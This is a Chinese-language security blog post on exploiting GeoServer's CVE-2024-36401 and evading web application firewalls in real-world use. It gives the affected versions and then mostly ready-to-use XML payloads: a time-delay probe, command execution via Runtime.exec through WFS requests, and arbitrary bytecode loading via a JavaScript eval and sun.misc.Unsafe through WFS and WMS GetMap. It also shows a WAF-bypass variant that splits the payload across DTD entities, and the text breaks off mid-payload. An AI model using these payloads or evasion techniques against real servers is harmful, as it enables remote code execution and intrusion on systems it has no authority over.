---
title: GeoServer Bypass WAF
url: https://mp.weixin.qq.com/s/Y5YJlLAmV2uKeWVagqZPDw
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:29:59.636981
---

# GeoServer Bypass WAF

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2GxepYWUT2y475BpicNJd4Cqw9RFmy2Ib252ibfO4AnxUQcupIhIA8cJ3M5yYlK9EdibLMfiboeWlceAByWKNf65Og/0?wx_fmt=jpeg)

# GeoServer Bypass WAF

原创

in1t0

Flykite

![]()

在小说阅读器中沉浸阅读

# 免责声明

> 本公众号所发布的所有内容，包括但不限于信息、工具、项目以及文章，均旨在提供学习与研究之用。所有工具安全性自测。如因此产生的一切不良后果与文章作者和本公众号无关。

简单总结一年来`CVE-2024-36401`在实战中绕过WAF的一些Tricks

受影响版本

* GeoServer < 2.23.6
* 2.24.0 <= GeoServer < 2.24.4
* 2.25.0 <= GeoServer < 2.25.2
* GeoTools < 29.6
* 31.0 <= GeoTools < 31.2
* 30.0 <= GeoTools < 30.4

# 获取图层原始信息

```
/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilitiesw
```

常见Poc

延时注入：可以用于判断漏洞是否存在

```
<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'>  <wfs:Query typeNames='sf:archsites'/>  <wfs:valueReference>java.lang.Thread.sleep(1500)</wfs:valueReference></wfs:GetPropertyValue>
```

命令执行：WFS GetPropertyValue

```
<wfs:GetFeature service="WFS" version="1.1.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs">  <wfs:Query typeName="topp:states">    <Filter>      <Intersects>        <PropertyName>exec(java.lang.Runtime.getRuntime(),"calc")</PropertyName>        </Intersects>      </Filter>  </wfs:Query></wfs:GetFeature>
```

命令执行：WFS GetFeature

```
<wfs:GetFeature service="WFS" version="1.0.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns:ogc="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs">  <wfs:Query typeName="topp:states">    <ogc:Filter>      <ogc:BBOX>        <ogc:PropertyName>exec(java.lang.Runtime.getRuntime(),"calc")</ogc:PropertyName>        <gml:Box srsName="http://www.opengis.net/gml/srs/epsg.xml#4326">           <gml:coordinates>-75.102613,40.212597 -72.361859,41.512517</gml:coordinates>        </gml:Box>      </ogc:BBOX>   </ogc:Filter>  </wfs:Query></wfs:GetFeature>
```

加载任意字节码：WFS GetPropertyValue

```
<wfs:GetFeature service="WFS" version="1.1.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs">  <wfs:Query typeName="topp:states">    <Filter>      <Intersects>        <PropertyName>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'var str="字节码base64";var bt;try {    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);} catch (e) {    bt = java.util.Base64.getDecoder().decode(str);}var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");theUnsafe.setAccessible(true);unsafe = theUnsafe.get(null);unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();')</PropertyName>        </Intersects>      </Filter>  </wfs:Query></wfs:GetFeature>
```

有些站的`WFS service`可能是被禁用或者是损坏的状态，也有可能`Layer`根本不存在。这个时候可以借助`WMS service`解决上述问题。

加载任意字节码：WMS getMap

```
POST /geoserver/wms HTTP/1.1Host: Content-Type: application/xml
<?xml version="1.0" encoding="UTF-8"?><ogc:GetMap xmlns:ogc="http://www.opengis.net/ows"             xmlns:gml="http://www.opengis.net/gml"             version="1.2.0"            service="WMS">  <StyledLayerDescriptor version="1.0.0"                          xsi:schemaLocation="http://www.opengis.net/sld StyledLayerDescriptor.xsd"                         xmlns="http://www.opengis.net/sld"                          xmlns:ogc="http://www.opengis.net/ogc"                          xmlns:xlink="http://www.w3.org/1999/xlink"                         xmlns:dave="http://blasby.com"                          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">    <UserLayer>      <Name>Inline</Name>      <InlineFeature>        <FeatureCollection>          <featureMember>            <BodyPart>              <Type>Mouth</Type>              <polygonProperty>                <gml:Polygon>                  <gml:outerBoundaryIs>                    <gml:LinearRing>                      <gml:coordinates>                        397,226 396,209 396,196 390,185 384,175 368,163 353,155 331,150 308,149 283,148 261,153 231,163                        209,175 195,189 186,209 182,221 187,226 193,214 195,205 200,197 203,192 215,185 226,177 241,171                        256,167 266,163 281,161 297,161 321,160 341,160 359,168 371,175 382,185 388,197 390,215 390,225                        394,226 397,226                      </gml:coordinates>                    </gml:LinearRing>                  </gml:outerBoundaryIs>                </gml:Polygon>              </polygonProperty>            </BodyPart>          </featureMember>        </FeatureCollection>      </InlineFeature>      <UserStyle>        <FeatureTypeStyle>          <Rule>            <Filter>              <Or>                <PropertyIsEqualTo>                  <PropertyName>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'var str="字节码base64";var bt;try {    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);} catch (e) {    bt = java.util.Base64.getDecoder().decode(str);}var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");theUnsafe.setAccessible(true);unsafe = theUnsafe.get(null);unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();')</PropertyName>                  <Literal>Eye</Literal>                </PropertyIsEqualTo>              </Or>            </Filter>            <PolygonSymbolizer>              <Fill>                <CssParameter name="fill">                  <ogc:Literal>#DD06E0</ogc:Literal>                </CssParameter>                <CssParameter name="fill-opacity">                  <ogc:Literal>1.0</ogc:Literal>                </CssParameter>              </Fill>              <Stroke>                <CssParameter name="stroke">                  <ogc:Literal>#FF00FF</ogc:Literal>                </CssParameter>              </Stroke>            </PolygonSymbolizer>          </Rule>        </FeatureTypeStyle>      </UserStyle>    </UserLayer>  </StyledLayerDescriptor>  <BoundingBox>    <gml:coord>      <gml:X>0</gml:X>      <gml:Y>0</gml:Y>    </gml:coord>    <gml:coord>      <gml:X>500</gml:X>      <gml:Y>500</gml:Y>    </gml:coord>  </BoundingBox>  <Output>    <Format>image/jpeg</Format>    <Transparent>false</Transparent>    <Size>      <Width>501</Width>      <Height>501</Height>    </Size>  </Output></ogc:GetMap>
```

# Bypass WAF

其实绕过WAF的本质就是利用一切你所知的**特性**。
此时，我们很容易想到：能不能利用XML的特性来重新构造上述PoC？

使用 DTD 进行实体声明

```
<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE root [    <!ENTITY a "eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'var str=">    <!ENTITY g '"' >    <!ENTITY h '"' >    <!ENTITY i ";var bt;try {bt = java.lang.Class.forName">    <!ENTITY b '("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);} catch (e) { bt = java.util.Base64.getDecoder'>    <!ENTITY c '().decode(str);}var theUnsafe = java.lang.Class.forName'>    <!ENTITY d '("sun.misc.Unsafe").getDeclaredField("theUnsafe");theUnsafe.setAccessible(true);unsafe = theUnsafe.get(null);unsafe.defineAnonymousClass(java.lang.Class.forName'>    <!ENTITY e '("java.lang.Class"), bt, null).newInstance();'>    <!ENTITY f "')">]><wfs:GetFeature service="WFS" version="1.1"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://w...